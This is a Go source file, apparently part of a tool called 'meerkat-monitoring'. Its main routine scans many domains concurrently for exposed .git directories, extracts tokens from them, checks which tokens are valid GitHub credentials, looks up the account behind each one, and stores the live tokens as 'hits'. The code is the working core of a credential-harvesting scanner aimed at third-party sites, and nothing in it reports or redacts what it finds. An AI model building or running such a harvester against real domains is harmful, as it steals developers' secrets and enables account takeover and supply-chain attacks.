package runner

import (
	"context"
	"time"

	"github.com/gabrielssssssssss/meerkat-monitoring/internal/models"
)

func (r *Runner) GitScanner(ctx context.Context, domains chan string) error {
	return r.GitScannerWithCtx(ctx, domains)
}

func (r *Runner) GitScannerWithCtx(ctx context.Context, domains chan string) error {
	for i := 0; i < r.options.Threads; i++ {
		go func(int) {
			for domain := range domains {
				url := "https://" + domain

				isExposed, _ := r.gitHarvest.IsGitExposed(url)
				if !isExposed {
					continue
				}

				var validTokens []string

				if isExposed {
					for _, path := range r.config.GitPath {
						tokens, err := r.gitHarvest.ExtractTokens(url, path)
						if err != nil {
							continue
						}

						validTokens = append(validTokens, tokens...)
					}
				}

				if len(validTokens) > 0 {
					for _, token := range validTokens {
						isValid, err := r.gitHarvest.IsValidToken(token)
						if err != nil || (!isValid) {
							continue
						}

						tokenInfo, err := r.gitHarvest.GetTokenInfo(token)
						if err != nil {
							continue
						}

						if r.hitService.Create(&models.Hit{
							URL:        url,
							Token:      token,
							UserGithub: *tokenInfo,
							CreatedAt:  time.Now(),
						}) != nil {
							continue
						}
					}
				}
			}
		}(i)
	}

	return nil
}
